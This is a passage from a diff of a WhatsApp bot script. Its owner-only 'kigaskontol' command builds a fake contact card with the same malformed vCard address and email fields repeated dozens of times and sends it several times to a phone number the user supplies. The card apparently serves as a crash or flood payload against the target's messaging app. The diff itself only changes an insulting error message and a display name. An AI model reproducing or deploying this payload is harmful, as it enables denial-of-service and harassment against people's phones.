karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
@@ -5418,9 +5509,9 @@ await m.reply(`Berhasil Mengirim Kontol Di Nomer ${text}`)
 }
 break
 case 'kigaskontol': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
-const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 